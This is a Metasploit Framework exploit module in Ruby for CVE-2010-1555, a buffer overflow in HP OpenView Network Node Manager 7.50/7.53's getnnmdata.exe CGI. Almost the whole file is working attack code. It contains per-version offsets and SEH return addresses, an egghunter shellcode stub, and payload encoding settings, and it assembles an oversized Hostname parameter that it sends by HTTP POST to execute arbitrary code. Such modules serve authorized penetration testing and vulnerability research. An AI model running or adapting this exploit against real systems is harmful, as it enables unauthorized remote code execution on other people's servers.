##
# $Id: hp_nnm_getnnmdata_hostname.rb 12131 2011-03-25 00:46:59Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/getnnmdata.exe', :pattern => /Hewlett-Packard Development Company/ }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager getnnmdata.exe (Hostname) CGI Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53.
				By sending specially crafted Hostname parameter to the getnnmdata.exe CGI,
				an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12131 $',
			'References'     =>
				[
					[ 'CVE', '2010-1555' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00",
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'DisableNops' => 'True',
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.50', { 'Offset' => 65640, 'Ret' => 0x5a01f277 } ], 
					[ 'HP OpenView Network Node Manager 7.53', { 'Offset' => 65640, 'Ret' => 0x5a666d69 } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 11 2010'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def exploit

		egg = rand_text_alpha_upper(4)

		hunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
		hunter << "\xef\xb8" + egg + "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

		boom =  rand_text_alpha_upper(target['Offset'])
		boom << generate_seh_record(target.ret)
		boom << hunter + egg + egg
		boom << payload.encoded
		boom << rand_text_alpha_upper(90024 - payload.encoded.length)
		
		sploit = "SnmpVals=&Hostname=#{boom}"

		print_status("Trying target #{target.name}...")

		send_request_cgi({
			'uri'		=> '/OvCgi/getnnmdata.exe',
			'method'	=> 'POST',
			'data'		=> sploit
			}, 8)
		
		handler

	end

end
